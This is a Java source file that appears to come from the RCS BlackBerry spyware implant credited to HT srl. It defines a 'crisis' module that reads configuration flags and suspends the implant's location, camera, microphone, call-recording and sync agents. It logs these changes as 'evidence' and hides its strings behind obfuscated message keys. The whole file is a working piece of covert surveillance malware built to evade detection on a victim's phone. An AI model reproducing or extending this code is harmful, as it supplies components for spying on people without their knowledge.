//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : CrisisAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import blackberry.Messages;
import blackberry.Status;
import blackberry.config.ConfModule;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;

/**
 * The Class CrisisAgent.
 */
public final class ModuleCrisis extends BaseModule {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModCrisis", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    public static final int NONE = 0x0; // Per retrocompatibilita'
    public static final int POSITION = 0x1; // Inibisci il GPS/GSM/WiFi Location Agent
    public static final int CAMERA = 0x2; // Inibisci il Camera Agent
    public static final int MIC = 0x3; // Inibisci la registrazione del microfono
    public static final int CALL = 0x4; // Inibisci l'agente di registrazione delle chiamate
    public static final int SYNC = 0x5; // Inibisci tutte le routine di sincronizzazione
    public static final int SIZE = 0x6;

    public static String getStaticType() {
        return Messages.getString("1b.0");//"crisis"; //$NON-NLS-1$
    }
    
    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    public boolean parse(ConfModule conf) {

        Status status = Status.self();
        try {
            if (conf.getBoolean(Messages.getString("1b.1"))) { //$NON-NLS-1$
                status.setCrisis(SYNC, true);
            }
            if (conf.getBoolean(Messages.getString("1b.2"))) { //$NON-NLS-1$
                status.setCrisis(CALL, true);
            }
            if (conf.getBoolean(Messages.getString("1b.3"))) { //$NON-NLS-1$
                status.setCrisis(MIC, true);
            }
            if (conf.getBoolean(Messages.getString("1b.4"))) { //$NON-NLS-1$
                status.setCrisis(CAMERA, true);
            }
            if (conf.getBoolean(Messages.getString("1b.5"))) { //$NON-NLS-1$
                status.setCrisis(POSITION, true);
            }
        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.trace(" (parse) Error: " + e); //$NON-NLS-1$
            //#endif
            return false;
        }

        return true;
    }

    public void actualStart() {
        Status.getInstance().startCrisis();
        Evidence.info(Messages.getString("1b.7")); //$NON-NLS-1$
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualLoop() {

    }

    public void actualStop() {
        Status.getInstance().stopCrisis();
        if (running) {
            Evidence.info(Messages.getString("1b.6")); //$NON-NLS-1$
        }
    }

}
